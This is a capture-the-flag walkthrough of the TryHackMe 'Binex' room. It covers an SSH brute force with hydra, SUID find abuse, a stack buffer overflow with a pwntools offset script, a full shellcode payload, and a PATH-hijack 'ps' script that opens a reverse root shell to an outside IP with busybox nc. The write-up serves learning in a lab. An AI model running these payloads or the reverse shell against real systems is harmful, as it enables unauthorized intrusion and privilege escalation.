# Binex

### Binex
Nmap scan shows ports 22,445 and 139 open. `smbclient` reveals THM_EXPLOIT workgroup:<br />
![Screenshot 2025-04-11 114143](https://github.com/user-attachments/assets/fd015d16-f08e-4973-a5fd-460692750dd2)<br />
`enum4linux` shows available users:<br />
![image](https://github.com/user-attachments/assets/78956835-0f5f-4d50-ba70-ef9b24b92db0)<br />
Now that I know users, I can try to bruteforce ssh login with those username, and after a while I was able to find `tryhackme`'s ssh password with `hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt ssh://10.10.64.65`. Now I need to become `des` user. Now I use the following command to find SUID binaries: `find / -perm -04000 2>/dev/null`:<br />
![Screenshot 2025-04-11 133452](https://github.com/user-attachments/assets/b0b9a4fb-a291-40ed-8d18-00a482767e08)<br />
There's the SUID on `find`. GTFObins shows how to exploit it. Just run the following command:<br />
![Screenshot 2025-04-11 133623](https://github.com/user-attachments/assets/99b387e0-5e78-415f-b630-be1940afa62a)<br />
Now I need to exploit a buffer overflow on a binary owned by `kel`. The source code of this binary is the following:

    #include <stdio.h>
    #include <unistd.h>
    
    int foo(){
            char buffer[600];
            int characters_read;
            printf("Enter some string:\n");
            characters_read = read(0, buffer, 1000);
            printf("You entered: %s", buffer);
            return 0;
    }
    
    void main(){
            setresuid(geteuid(), geteuid(), geteuid());
            setresgid(getegid(), getegid(), getegid());
    
            foo();
    }
The buffer is 600 bytes long, but the code allows me to prompt up to 1000 bytes. This means that I can overflow the buffer and do some damage. There's no `win` function to return to, however if I run checksec I get this:<br />
![image](https://github.com/user-attachments/assets/c92139d1-610a-4d3a-b54d-d9a8dbfd2c69)<br />
There's no stack canary that prevents me to overwrite the return address, and the NX is disabled, meaning that code can be executed on the stack. This means that the idea is to put some shellcode into the buffer and then overwrite the return address with the address of the shellcode.<br />
First of all I need to find the offset to overwrite the Instruction Pointer. To do that I'll use the following script (note that I transfered the binary on my machine):

    from pwn import *
    
    io = process('./thelibrarian')
    print(io.recvregex(b':')) # read until we get the prompt
    
    io.recvline()
    io.sendline(cyclic(500))
    io.wait()
    core = io.corefile
    stack = core.rsp
    info("rsp = %#x", stack)
    pattern = core.read(stack, 4)
    rip_offset = cyclic_find(pattern)
    info("rip offset is %d", rip_offset)
![image](https://github.com/user-attachments/assets/30ce513d-8724-4366-8c7b-199a675a2db2)<br />
So the offset is `616`.
Final payload to exploit the binary is: `	
(python -c 'print("\x90"* (616 - 27 - 50) + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90" * 50 + "\x7c\xe3\xff\xff\xff\x7f\x00\x00")'; cat) | ./bof`.

<br /><br />
Now, as `kel`, I need to exploit the following SUID binary:

    #include <unistd.h>
    
    void main()
    {
            setuid(0);
            setgid(0);
            system("ps");
    }
The idea is simple, just create a custom malicious `ps` file in my own directory, then change the PATH environment variable to first look inside `kel`'s home directory. <br />
So, first run `export PATH=/home/kel:$PATH`, then create a custom file called `ps` that has the following content (adapt to your IP addr and port):

    #!/bin/bash
    busybox nc 10.11.127.156 9001 -e sh
Now run `chmod +x ps`, open a netcat listener on your machine and then just run `./exe` to get a reverse root shell!
